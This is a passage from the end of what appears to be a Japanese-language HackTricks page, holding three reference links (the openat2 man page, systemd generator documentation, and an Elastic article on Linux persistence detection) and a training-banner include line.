- [34] [`openat2(2)` — Linux マニュアルページ](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator ドキュメント](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: 永続化メカニズム](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
